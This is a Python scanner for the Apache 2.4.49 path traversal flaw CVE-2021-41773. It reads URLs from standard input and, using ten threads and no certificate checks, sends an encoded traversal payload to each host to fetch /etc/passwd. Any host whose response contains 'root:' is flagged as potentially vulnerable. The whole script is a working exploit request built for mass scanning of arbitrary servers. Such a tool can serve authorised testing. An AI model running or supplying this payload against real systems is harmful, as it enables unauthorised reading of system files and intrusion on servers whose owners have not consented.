#!/usr/bin/env python3

# Take URLs on std in and try to ascertain if they are vulnerable to CVE-2021-41773 Path Traversal in Apache 2.4.49.
# Threaded for performance reasons
# CVE-2021-41773

import sys
import requests
import concurrent.futures

# Disable certificate warnings
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

payload = '/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd'

def testURL(url):
    try:
        response = requests.get(f'{url}{payload}', timeout = 10, verify = False)
        if 'root:' in response.content.decode():
            print(f'[*] Potentially Vulnerable [*] - {url}')
    except Exception:
        pass

# Take URLs from std in
urls = []
for line in sys.stdin:
    urls.append(line.rstrip())

# Threaded for performance
with concurrent.futures.ThreadPoolExecutor(max_workers = 10) as executor:
    executor.map(testURL, urls)
